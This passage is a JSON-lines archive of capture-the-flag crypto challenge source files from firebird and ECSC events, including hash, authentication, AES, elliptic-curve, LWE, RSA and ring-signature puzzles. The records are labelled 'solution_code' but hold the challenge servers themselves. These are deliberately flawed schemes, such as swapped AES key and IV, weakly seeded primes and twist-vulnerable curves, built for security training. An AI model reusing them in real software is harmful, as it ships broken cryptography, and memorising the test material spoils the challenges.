{"source": "ctf_archive", "path": "data\\ctf_archive\\firebird2022-collider\\server_files\\chall.py", "category": "crypto", "solution_code": "from gmpy2 import is_prime\nimport random\nimport sys\nimport re\nimport os\n\ndef hash(m):\n    m = int.from_bytes(b'SECUREHASH_' + m, 'big')\n    return pow(g, m, p).to_bytes(256//8, 'big')\n\nif __name__ == '__main__':\n    flag = os.environ.get('FLAG', 'firebird{***REDACTED***}')\n\n    while True:\n        g = random.getrandbits(256)\n        p = random.getrandbits(256)\n        if not is_prime(p): continue\n        break\n\n    for _ in range(5):\n        m = input().strip()\n\n        if re.match(r'^[a-z]+$', m) is None:\n            print('Please be less rude.')\n            sys.exit(0) \n\n        m = m.encode()\n        h = hash(m)\n        print(f'h({m}) = {h.hex()}')\n\n        if m == b'pleasegivemetheflag':       continue\n        if h != hash(b'pleasegivemetheflag'): continue\n    \n        print(f'Congrats! {flag}')\n        sys.exit(0)\n", "name": "chall"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\firebird2022-authenticator\\release_files\\chall.py", "category": "crypto", "solution_code": "import random\nimport os\nimport signal\nimport sys\nfrom blake3 import blake3 # https://pypi.org/project/blake3/\n\n\ndef tle_handler(*kwargs):\n    raise Exception('Time limit exceeded.')\n\n\nclass AuthenticationServer:\n    def __init__(self, password):\n        self.password = password\n        self.challenge = None\n\n    def handshake(self, challenge):\n        if len(challenge) != 16:\n            raise Exception('Invalid challenge length.')\n        \n        self.challenge = os.urandom(16)\n\n        # response = HASH(password || \"HANDSHAKE_FROM_SERVER\" || challenge)\n        response = blake3(self.password + b\"HANDSHAKE_FROM_SERVER\" + challenge).digest()\n\n        return response, self.challenge\n\n\n    def verify_handshake(self, response):\n        if self.challenge is None:\n            raise Exception('Server did not generate a challenge. Use `generate_challenge` to generate a challenge first.')\n        if response != blake3(self.password + b\"HANDSHAKE_FROM_CLIENT\" + self.challenge).digest():\n            raise Exception('Invalid response.')\n\n        return\n\n\nclass AuthenticationClient:\n    def __init__(self, password):\n        self.password = password\n        self.challenge = None\n\n    def generate_challenge(self):\n        self.challenge = os.urandom(16)\n        return self.challenge\n\n    def verify_handshake(self, response, challenge):\n        if self.challenge is None:\n            raise Exception('Client did not generate a challenge. Use `generate_challenge` to generate a challenge first.')\n        if response != blake3(self.password + b\"HANDSHAKE_FROM_SERVER\" + self.challenge).digest():\n            raise Exception('Invalid response.')\n\n        # response = HASH(password || \"HANDSHAKE_FROM_CLIENT\" || challenge)\n        response = blake3(self.password + b\"HANDSHAKE_FROM_CLIENT\" + challenge).digest()\n        \n        return response\n\n\n# I'll show you the protocol.\ndef test():\n    password = bytes(random.sample(b'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', 6))\n\n    client = AuthenticationClient(password)\n    server = AuthenticationServer(password)\n\n    # == The protocol ==\n\n    # Steps 1+2+3: Client could verify that the server has the password, without leaking the password.\n    # Steps 2+3+4: Server could verify that the client has the password, hence completing the authentication.\n\n    # Step 1: Client generates a 16-byte challenge.\n    challenge_client = client.generate_challenge()\n\n    # Step 2: Client sends the challenge to the server.\n    #         Server computes a response and generates a challenge.\n    response_server, challenge_server = server.handshake(challenge_client)\n\n    # Step 3: Server sends the response and the challenge to the client.\n    #         Client verifies the response and solves the challenge.\n    response_client = client.verify_handshake(response_server, challenge_server)\n\n    server.verify_handshake(response_client)\n\n\n# Now, it is your turn!\ndef main():\n    flag = os.environ.get('FLAG', 'firebird{***REDACTED***}')\n\n    # 6 letter password is not secure enough (there are only ~36 bit entropy).\n    # Sarcastly, you cannot exhaust them during the CTF anyway. :)\n    password = bytes(random.sample(b'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', 6))\n\n    client = AuthenticationClient(password)\n    server = AuthenticationServer(password)\n\n    # == The protocol ==\n    \n    # Oh of course I am not patient.\n    signal.alarm(10)\n    signal.signal(signal.SIGALRM, tle_handler)\n\n    # Steps 1+2+3: Client could verify that the server has the password, without leaking the password.\n    # Steps 2+3+4: Server could verify that the client has the password, hence completing the authentication.\n\n    try:\n        # Step 1: Client generates a 16-byte challenge.\n        challenge_client = bytes.fromhex(input('challenge_client = '))\n\n        # Step 2: Client sends the challenge to the server.\n        #         Server computes a response and generates a challenge.\n        response_server, challenge_server = server.handshake(challenge_client)\n\n        # Step 3: Server sends the response and the challenge to the client.\n        #         Client verifies the response and solves the challenge.\n        print(f'response_server = {response_server.hex()}')\n        print(f'challenge_server = {challenge_server.hex()}')\n        response_client = bytes.fromhex(input('response_client = '))\n\n        # Step 4: Client sends the response to the server.\n        #         Server verifies the response and finishes authenticating the user.\n        server.verify_handshake(response_client)\n\n        print(f'Congrats! {flag}')\n    except Exception as err:\n        print(f'\\033[031mError: {err}\\033[0m')\n\n\nif __name__ == '__main__':\n    test()\n    main()", "name": "chall"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\firebird2022-authenticator\\server_files\\chall.py", "category": "crypto", "solution_code": "import random\nimport os\nimport signal\nimport sys\nfrom blake3 import blake3 # https://pypi.org/project/blake3/\n\n\ndef tle_handler(*kwargs):\n    raise Exception('Time limit exceeded.')\n\n\nclass AuthenticationServer:\n    def __init__(self, password):\n        self.password = password\n        self.challenge = None\n\n    def handshake(self, challenge):\n        if len(challenge) != 16:\n            raise Exception('Invalid challenge length.')\n        \n        self.challenge = os.urandom(16)\n\n        # response = HASH(password || \"HANDSHAKE_FROM_SERVER\" || challenge)\n        response = blake3(self.password + b\"HANDSHAKE_FROM_SERVER\" + challenge).digest()\n\n        return response, self.challenge\n\n\n    def verify_handshake(self, response):\n        if self.challenge is None:\n            raise Exception('Server did not generate a challenge. Use `generate_challenge` to generate a challenge first.')\n        if response != blake3(self.password + b\"HANDSHAKE_FROM_CLIENT\" + self.challenge).digest():\n            raise Exception('Invalid response.')\n\n        return\n\n\nclass AuthenticationClient:\n    def __init__(self, password):\n        self.password = password\n        self.challenge = None\n\n    def generate_challenge(self):\n        self.challenge = os.urandom(16)\n        return self.challenge\n\n    def verify_handshake(self, response, challenge):\n        if self.challenge is None:\n            raise Exception('Client did not generate a challenge. Use `generate_challenge` to generate a challenge first.')\n        if response != blake3(self.password + b\"HANDSHAKE_FROM_SERVER\" + self.challenge).digest():\n            raise Exception('Invalid response.')\n\n        # response = HASH(password || \"HANDSHAKE_FROM_CLIENT\" || challenge)\n        response = blake3(self.password + b\"HANDSHAKE_FROM_CLIENT\" + challenge).digest()\n        \n        return response\n\n\n# I'll show you the protocol.\ndef test():\n    password = bytes(random.sample(b'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', 6))\n\n    client = AuthenticationClient(password)\n    server = AuthenticationServer(password)\n\n    # == The protocol ==\n\n    # Steps 1+2+3: Client could verify that the server has the password, without leaking the password.\n    # Steps 2+3+4: Server could verify that the client has the password, hence completing the authentication.\n\n    # Step 1: Client generates a 16-byte challenge.\n    challenge_client = client.generate_challenge()\n\n    # Step 2: Client sends the challenge to the server.\n    #         Server computes a response and generates a challenge.\n    response_server, challenge_server = server.handshake(challenge_client)\n\n    # Step 3: Server sends the response and the challenge to the client.\n    #         Client verifies the response and solves the challenge.\n    response_client = client.verify_handshake(response_server, challenge_server)\n\n    server.verify_handshake(response_client)\n\n\n# Now, it is your turn!\ndef main():\n    flag = os.environ.get('FLAG', 'firebird{***REDACTED***}')\n\n    # 6 letter password is not secure enough (there are only ~36 bit entropy).\n    # Sarcastly, you cannot exhaust them during the CTF anyway. :)\n    password = bytes(random.sample(b'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', 6))\n\n    client = AuthenticationClient(password)\n    server = AuthenticationServer(password)\n\n    # == The protocol ==\n    \n    # Oh of course I am not patient.\n    signal.alarm(10)\n    signal.signal(signal.SIGALRM, tle_handler)\n\n    # Steps 1+2+3: Client could verify that the server has the password, without leaking the password.\n    # Steps 2+3+4: Server could verify that the client has the password, hence completing the authentication.\n\n    try:\n        # Step 1: Client generates a 16-byte challenge.\n        challenge_client = bytes.fromhex(input('challenge_client = '))\n\n        # Step 2: Client sends the challenge to the server.\n        #         Server computes a response and generates a challenge.\n        response_server, challenge_server = server.handshake(challenge_client)\n\n        # Step 3: Server sends the response and the challenge to the client.\n        #         Client verifies the response and solves the challenge.\n        print(f'response_server = {response_server.hex()}')\n        print(f'challenge_server = {challenge_server.hex()}')\n        response_client = bytes.fromhex(input('response_client = '))\n\n        # Step 4: Client sends the response to the server.\n        #         Server verifies the response and finishes authenticating the user.\n        server.verify_handshake(response_client)\n\n        print(f'Congrats! {flag}')\n    except Exception as err:\n        print(f'\\033[031mError: {err}\\033[0m')\n\n\nif __name__ == '__main__':\n    test()\n    main()", "name": "chall"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\firebird2021-oofbleck\\release_files\\chall.py", "category": "crypto", "solution_code": "import re\nimport os\nimport base64\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad, unpad\n\nfrom secret import flag\n\ndef encrypt(message, key):\n    iv = os.urandom(16)\n    cipher = AES.new(iv, AES.MODE_OFB, key)\n    message = pad(message, 16)\n    ciphertext = iv + cipher.encrypt(message)\n    return ciphertext\n\ndef decrypt(ciphertext, key):\n    iv, ciphertext = ciphertext[:16], ciphertext[16:]\n    cipher = AES.new(iv, AES.MODE_OFB, key)\n    message = cipher.decrypt(ciphertext)\n    return unpad(message, 16)\n\nif __name__ == '__main__':\n    key = os.urandom(16)\n    assert re.match(r'^firebird\\{\\w{58}\\}$', flag)\n\n    ciphertext = encrypt(flag.encode(), key)\n    assert decrypt(ciphertext, key) == flag.encode()\n    print(base64.b64encode(ciphertext).decode())\n", "name": "chall"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\firebird2021-oofbleck\\release_files\\secret.py", "category": "crypto", "solution_code": "flag = 'firebird{**REDACTED**}'", "name": "secret"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ecsc2024-One-Round-Crypto\\release_files\\one_round_crypto.py", "category": "crypto", "solution_code": "../server_files/chall.py", "name": "one_round_crypto"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ecsc2024-One-Round-Crypto\\server_files\\chall.py", "category": "crypto", "solution_code": "#!/usr/bin/env python3\n\nimport random\nfrom hashlib import sha256\nfrom Crypto.Util.Padding import pad\nimport os\n\ndim = 16\nmixing_rounds = 12\n\nflag = os.getenv('FLAG', 'ECSC{testflag}')\nkey = os.urandom(16)\n\nS = [\n        0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,\n\t\t0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,\n\t\t0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,\n\t\t0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,\n\t\t0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,\n\t\t0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,\n\t\t0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,\n\t\t0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,\n\t\t0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,\n\t\t0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,\n\t\t0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,\n\t\t0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,\n\t\t0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,\n\t\t0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,\n\t\t0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,\n\t\t0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16\n    ]\n\ndef xor(a,b):\n    return bytes([x^y for x,y in zip(a,b)])\n\ndef rotr(chunk, r, size):\n    val = int.from_bytes(chunk, 'big')\n    val = (val >> r) | ((val & (1<<r)-1) << (8*size-r))\n    return int.to_bytes(val, size, 'big')\n\ndef update_key(key):\n    return sha256(key).digest()\n\ndef mix(msg, current_key):\n    random.seed(current_key)\n\n    for _ in range(mixing_rounds):\n        chunks = [msg[i:i+dim//4] for i in range(0, dim, dim//4)]\n\n        chunks[0] = xor(chunks[0], xor(rotr(chunks[0], random.randint(1, 2*dim), dim//4), rotr(chunks[0], random.randint(1, 2*dim), dim//4)))\n        chunks[1] = xor(chunks[1], xor(rotr(chunks[1], random.randint(1, 2*dim), dim//4), rotr(chunks[1], random.randint(1, 2*dim), dim//4)))\n        chunks[2] = xor(chunks[2], xor(rotr(chunks[2], random.randint(1, 2*dim), dim//4), rotr(chunks[2], random.randint(1, 2*dim), dim//4)))\n        chunks[3] = xor(chunks[3], xor(rotr(chunks[3], random.randint(1, 2*dim), dim//4), rotr(chunks[3], random.randint(1, 2*dim), dim//4)))\n\n        msg = b\"\".join(chunks)\n        msg = xor(msg, xor(rotr(msg, dim//2-1, dim), rotr(msg, dim//2+1, dim)))\n\n    return msg\n\ndef sub(msg, current_key):\n    keyed_S = []\n\n    for i in range(dim):\n        tmp = [(x+current_key[i])%256 for x in S]\n        keyed_S.append(tmp)\n    \n    return bytes([keyed_S[i][x] for i,x in enumerate(msg)])\n\ndef enc(msg, key = key):\n    msg = bytes.fromhex(msg)\n    msg = pad(msg, dim)\n    res = \"\"\n    blocks = [msg[i:i+dim] for i in range(0, len(msg), dim)]\n\n    for block in blocks:\n        current_key = update_key(key)\n        enc = mix(block, current_key)\n        current_key = update_key(current_key)\n        enc = sub(enc, current_key)\n        current_key = update_key(current_key)\n        enc = mix(enc, current_key)\n        res += bytes(enc).hex()\n    return res\n\nm = input(\"> \")\nprint(enc(m))\n\nprint(\"=\"*50)\n\nfor _ in range(100):\n    m = os.urandom(dim-1).hex()\n    e = enc(m)\n    print(e)\n    guess = input(\"> \")\n    if guess != m:\n        print(\"Wrong!\")\n        exit()\n\nprint(flag)\n", "name": "chall"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ecsc2024-OffTopic\\release_files\\offtopic.py", "category": "crypto", "solution_code": "../server_files/chall.py", "name": "offtopic"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ecsc2024-OffTopic\\server_files\\chall.py", "category": "crypto", "solution_code": "#!/usr/bin/env python3\n\nfrom Crypto.PublicKey.ECC import EccPoint\nfrom Crypto.Random import random\nimport hashlib\nimport json\nimport os\n\nflag = os.getenv('FLAG', 'ECSC{redacted}')\n\np = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff\nGx = 0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296\nGy = 0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5\nq = 0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551\nG = EccPoint(Gx, Gy)\nH = None\n\n\nclass Ciphertext:\n    def __init__(self, value):\n        self.R = value[0]\n        self.S = value[1]\n\n    @classmethod\n    def from_pt(cls, m):\n        r = random.randint(0, q-1)\n        R = r*G\n        S = r*H + m*G\n        return cls([R, S])\n\n    def __add__(self, other):\n        if isinstance(other, int):\n            return self + Ciphertext.from_pt(other)\n        rand = Ciphertext.from_pt(0)\n        return Ciphertext([self.R+other.R+rand.R, self.S+other.S+rand.S])\n\n    def __rmul__(self, other):\n        if not isinstance(other, int):\n            raise NotImplementedError\n        rand = Ciphertext.from_pt(0)\n        return Ciphertext([rand.R + other*self.R, rand.S + other*self.S])\n    \n    def __neg__(self):\n        return Ciphertext([-self.R, -self.S])\n\n    def __sub__(self, other):\n        return self + (-other)\n\n    def __rsub__(self, other):\n        if isinstance(other, int):\n            return Ciphertext.from_pt(other) - self\n        \n\ndef round():\n    data = json.loads(input(\"Send your encrypted choice bit: \"))\n    C = Ciphertext([EccPoint(data[\"Rx\"], data[\"Ry\"]), EccPoint(data[\"Sx\"], data[\"Sy\"])])\n    m0 = random.randint(0, 9)\n    m1 = random.randint(0, 9)\n    res = m0 * (1-C) + m1 * C\n    print(json.dumps({\"Rx\": int(res.R.x), \"Ry\": int(res.R.y), \"Sx\": int(res.S.x), \"Sy\": int(res.S.y)}))\n    data = json.loads(input(\"Send the recovered messages: \"))\n    return m0 == data[\"m0\"] and m1 == data[\"m1\"]\n\ndef get_pk():\n    global H\n    data = json.loads(input(\"Send your public key: \"))\n    H = EccPoint(data[\"Hx\"], data[\"Hy\"])\n    assert H != G\n\n\ndef main():\n    print(\"Welcome to my new guessing game! Are you ready?\")\n    get_pk()\n\n    for _ in range(128):\n        assert round()\n\n    print(flag)\n\n\nif __name__ == \"__main__\":\n    main()", "name": "chall"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ecsc2023-twist-and-shout\\release_files\\twist_and_shout.py", "category": "crypto", "solution_code": "../server_files/twist_and_shout.py", "name": "twist_and_shout"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ecsc2023-twist-and-shout\\server_files\\twist_and_shout.py", "category": "crypto", "solution_code": "\"\"\"\nDefine the elliptic curve\n\nE: y^2 = x^3 + a*x + b\n\nWith order\n\nn = 340282366920938463465004184633952524077\n  = 2^128 - 1629577202184312621\n\"\"\"\nq = 2**128 - 159\na = 1\nb = 1494\n\n\n# Curve addition law using only x-coordinates, coded from\n# https://www.hyperelliptic.org/EFD/g1p/data/shortw/xz/ladder/ladd-2002-it\ndef xDBLADD(P, Q, PQ):\n    (X1, Z1), (X2, Z2), (X3, Z3) = PQ, P, Q\n    X4 = (X2**2 - a * Z2**2) ** 2 - 8 * b * X2 * Z2**3\n    Z4 = 4 * (X2 * Z2 * (X2**2 + a * Z2**2) + b * Z2**4)\n    X5 = Z1 * ((X2 * X3 - a * Z2 * Z3) ** 2 - 4 * b * Z2 * Z3 * (X2 * Z3 + X3 * Z2))\n    Z5 = X1 * (X2 * Z3 - X3 * Z2) ** 2\n    X4, Z4, X5, Z5 = (c % q for c in (X4, Z4, X5, Z5))\n    return (X4, Z4), (X5, Z5)\n\n\n# Montgomery Ladder for scalar multiplication\ndef xMUL(P, k):\n    Q, R = (1, 0), P\n    for i in reversed(range(k.bit_length() + 1)):\n        if k >> i & 1:\n            R, Q = Q, R\n        Q, R = xDBLADD(Q, R, P)\n        if k >> i & 1:\n            R, Q = Q, R\n    return Q\n\n\ndef gen_secret(secret):\n    d = secret.lstrip(\"ECSC{\").rstrip(\"}\")\n    return int.from_bytes(d.encode(), \"big\")\n\n\ndef shout(x, d):\n    P = (x, 1)\n    Q = xMUL(P, d)\n    return Q[0] * pow(Q[1], -1, q) % q\n\n\ndef challenge():\n    \"\"\"\n    My curve has prime order, so I'll let you\n    send as many points as you like! You'll\n    never recover my secret before your flight home!!\n    \"\"\"\n    import os\n    flag = os.environ.get(\"FLAG\", \"ECSC{fake_flag_for_testing}\").strip()\n    d = gen_secret(flag)\n\n    while True:\n        x = int(input(\"x-coordinate: \"))\n        print(shout(x, d))\n\n\nif __name__ == \"__main__\":\n    challenge()\n", "name": "twist_and_shout"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ecsc2023-tough-decisions\\release_files\\tough_decisions.py", "category": "crypto", "solution_code": "import secrets\n\n\ndef drbg():\n    # wuch wow, very deterministic\n    return secrets.randbelow(2)\n\n\ndef sample_noise(n):\n    e = 0\n    for _ in range(n):\n        e |= drbg()\n        e <<= 1\n    return e\n\n\ndef sample_key():\n    # LWE estimator told me I'd have more bits of security than bits in my key...\n    return secrets.token_bytes(16)\n\n\ndef get_flag():\n    with open(\"flag.txt\") as f:\n        bs = f.read().strip().encode()\n    return [(b >> i) & 1 for b in bs for i in range(8)]\n\n\ndef dot(a, s):\n    return sum(x * y for x, y in zip(a, s))\n\n\ndef real(s):\n    a = secrets.token_bytes(len(s))\n    e = sample_noise(7) - 64\n    return a, (dot(a, s) + e) % 256\n\n\ndef fake(s):\n    a = secrets.token_bytes(len(s))\n    return a, secrets.randbelow(256)\n\n\nif __name__ == \"__main__\":\n    s = sample_key()\n    for b in get_flag():\n        print([[real, fake][b](s) for _ in range(6)])\n", "name": "tough_decisions"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ecsc2023-RRSSAA\\release_files\\RRSSAA.py", "category": "crypto", "solution_code": "from math import prod\nfrom secrets import randbelow\nimport random\nfrom Crypto.Util.number import *\n\ndef get_prime(n):\n    p = 1\n    r = random.Random()\n    r.seed(randbelow(2**n))\n    while not isPrime(p):\n        p = r._randbelow(2**256) | 1\n    return p\n\nflag = open(\"flag.txt\", \"rb\").read().strip()\nassert len(flag) == 128\nN = prod(get_prime(i) for i in range(2, len(flag)))\nprint(hex(N), hex(pow(bytes_to_long(flag), 0x10001, N)))\n", "name": "RRSSAA"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ecsc2023-put-a-ring-on-it\\release_files\\chal.py", "category": "crypto", "solution_code": "#!/usr/bin/env python3\n\nimport json\nimport random\nimport time\nfrom hashlib import sha256\nfrom os import urandom\nfrom Crypto.Cipher import AES\n\nimport ed25519\n\nNUM_LEVELS = 16\nRING_SIZE = 16\n\nrand = random.SystemRandom()\n\n\ndef hexlify(inp):\n    return inp.encode('latin-1').hex()\n\n\ndef unhexlify(inp):\n    return bytes.fromhex(inp).decode('latin-1')\n\n\ndef public_key(sk):\n    return hexlify(ed25519.encodepoint(ed25519.scalarmultbase(sk)))\n\n\ndef random_scalar():\n    return rand.getrandbits(256)\n\n\ndef toPoint(hexVal):\n    aa = unhexlify(hexVal)\n    return ed25519.decodepoint(aa)\n\n\ndef scalarmult_simple(pk, num):\n    return ed25519.encodepoint(ed25519.scalarmult(toPoint(pk), num))\n\n\ndef scalarmultKeyInt(pk, num):\n    return hexlify(scalarmult_simple(pk, num))\n\n\ndef addKeys(P1, P2):\n    return hexlify(ed25519.encodepoint(ed25519.edwards(toPoint(P1), toPoint(P2))))\n\n\ndef scalar_hash(val):\n    return int(sha256(val.encode('latin-1')).hexdigest(), base=16)\n\n\ndef hash_to_point(val):\n    return public_key(scalar_hash(val))\n\n\ndef key_image(privkey):\n    return scalarmultKeyInt(hash_to_point(public_key(privkey)), privkey)\n\n\ndef ring_sign(message, public_keys, my_privkey, my_pubkey, my_index):\n    image = key_image(my_privkey)\n\n    sigc = [0 for xx in range(RING_SIZE)]\n    sigr = [0 for xx in range(RING_SIZE)]\n\n    buf = message\n    sumc = 0\n\n    for i in range(RING_SIZE):\n        if i == my_index:\n            q = random_scalar()\n            L = public_key(q)\n            R = scalarmultKeyInt(hash_to_point(my_pubkey), q)\n        else:\n            q = random_scalar()\n            w = random_scalar()\n\n            L = addKeys(public_key(q), scalarmultKeyInt(public_keys[i], w))\n            R = addKeys(\n                scalarmultKeyInt(hash_to_point(public_keys[i]), q),\n                scalarmultKeyInt(image, w)\n            )\n\n            sigc[i] = w\n            sigr[i] = q\n            sumc += sigc[i]\n\n        buf += L\n        buf += R\n        print(f\"{i+1}/{RING_SIZE}\")\n\n    c = scalar_hash(buf)\n\n    sigc[my_index] = (c - sumc) % ed25519.l\n    sigr[my_index] = (q - sigc[my_index] * my_privkey) % ed25519.l\n\n    return image, sigc, sigr\n\n\ndef gen_ring(msg):\n    public_keys = [public_key(random_scalar()) for i in range(RING_SIZE)]\n    my_privkey = random_scalar()\n    my_pubkey = public_key(my_privkey)\n    my_index = random.randrange(0, len(public_keys))\n    public_keys[my_index] = my_pubkey\n\n    signature = ring_sign(msg, public_keys, my_privkey, my_pubkey, my_index)\n\n    return signature, public_keys, my_index\n\n\ndef gen_levels():\n    levels = []\n    for level in range(NUM_LEVELS):\n        msg = f\"Generating ring {level}\"\n        print(msg)\n        signature, pks, my_key = gen_ring(msg)\n        levels.append({\n            \"signature\": signature,\n            \"public_keys\": pks,\n            \"my_key\": my_key,\n        })\n        print(level)\n\n    with open(\"flag.txt\") as f:\n        flag = f.read().strip().encode()\n\n    # First byte of each of my public keys\n    aes_key = bytes.fromhex(\"\".join([l[\"public_keys\"][l[\"my_key\"]][0:2] for l in levels]))\n    aes_iv = urandom(16)\n    cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)\n    encrypted = cipher.encrypt(flag)\n\n    output = {\n        \"levels\": levels,\n        \"iv\": aes_iv.hex(),\n        \"enc\": encrypted.hex(),\n    }\n\n    with open(\"data-private.json\", \"w\") as f:\n        f.write(json.dumps(output))\n\n    for level in output[\"levels\"]:\n        del level[\"my_key\"]\n    with open(\"data.json\", \"w\") as f:\n        f.write(json.dumps(output))\n\nif __name__ == \"__main__\":\n    gen_levels()\n", "name": "chal"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ecsc2023-put-a-ring-on-it\\release_files\\ed25519.py", "category": "crypto", "solution_code": "# Note, this library comes from:\n# https://raw.githubusercontent.com/monero-project/mininero/master/ed25519.py\n# And has some small updates to work in Python3\n# Hint: intended vuln is not in this library\n\n#ed25519.cr.yp.to/python/ed25519.py\nimport hashlib\n\nb = 256\nq = 2**255 - 19\nl = 2**252 + 27742317777372353535851937790883648493\n\ndef H(m):\n  return hashlib.sha512(m).digest()\n\ndef expmod(b,e,m):\n  if e == 0: return 1\n  t = expmod(b,e//2,m)**2 % m\n  if e & 1: t = (t*b) % m\n  return t\n\ndef inv(x):\n  return expmod(x,q-2,q)\n\nd = -121665 * inv(121666)\nI = expmod(2,(q-1)//4,q)\n\ndef radix255(x):\n    x = x % q\n    if x + x > q: x -= q\n    x = [x,0,0,0,0,0,0,0,0,0]\n    bits = [26,25,26,25,26,25,26,25,26,25]\n    for i in range(9):\n        carry = (x[i] + 2**(bits[i]-1)) // 2**bits[i]\n        x[i] -= carry * 2**bits[i]\n        x[i + 1] += carry\n    result = \"\"\n    for i in range(9):\n        result = result+str(x[i])+\",\"\n    result = result+str(x[9])\n    return result\n\ndef theD():\n    return d\n\ndef computeA():\n  return 2 *((1 - d) % q) * inv((1 + d) % q) % q\n\ndef xrecover(y):\n  xx = (y*y-1) * inv(d*y*y+1)\n  x = expmod(xx,(q+3)//8,q)\n  if (x*x - xx) % q != 0: x = (x*I) % q\n  if x % 2 != 0: x = q-x\n  return x\n\ndef sqroot(xx):\n  x = expmod(xx,(q+3)//8,q)\n  if (x*x - xx) % q != 0: \n    x = (x*I) % q\n  if (x*x - xx) % q != 0: \n    print(\"no square root!\")\n  return x\n\n  \n\nBy = 4 * inv(5)\nBx = xrecover(By)\nB = [Bx % q,By % q]\n\ndef edwards(P,Q):\n  x1 = P[0]\n  y1 = P[1]\n  x2 = Q[0]\n  y2 = Q[1]\n  x3 = (x1*y2+x2*y1) * inv(1+d*x1*x2*y1*y2)\n  y3 = (y1*y2+x1*x2) * inv(1-d*x1*x2*y1*y2) \n  return [x3 % q,y3 % q]\n\ndef edwards_Minus(P, Q): #added \n  x1 = P[0]\n  y1 = P[1]\n  x2 = (-1 * Q[0]) % q\n  y2 = Q[1]\n  x3 = (x1*y2+x2*y1) * inv(1+d*x1*x2*y1*y2)\n  y3 = (y1*y2+x1*x2) * inv(1-d*x1*x2*y1*y2) \n  return [x3 % q,y3 % q]\n\n\ndef scalarmult(P,e):\n  if e == 0: return [0,1]\n  Q = scalarmult(P,e//2)\n  Q = edwards(Q,Q)\n  if e & 1: Q = edwards(Q,P)\n  return Q\n\n#added scalarmultbase\ndef scalarmultbase(e):\n  if e == 0: return [0,1]\n  Q = scalarmult(B,e//2)\n  Q = edwards(Q,Q)\n  if e & 1: Q = edwards(Q,B)\n  return Q\n\ndef encodeint(y):\n  bits = [(y >> i) & 1 for i in range(b)]\n  return ''.join([chr(sum([bits[i * 8 + j] << j for j in range(8)])) for i in range(b//8)])\n\ndef encodepoint(P):\n  x = P[0]\n  y = P[1]\n  bits = [(y >> i) & 1 for i in range(b - 1)] + [x & 1]\n  return ''.join([chr(sum([bits[i * 8 + j] << j for j in range(8)])) for i in range(b//8)])\n\ndef bit(h,i):\n  return (ord(h[i//8]) >> (i%8)) & 1\n\ndef publickey(sk):\n  h = H(sk)\n  a = 2**(b-2) + sum(2**i * 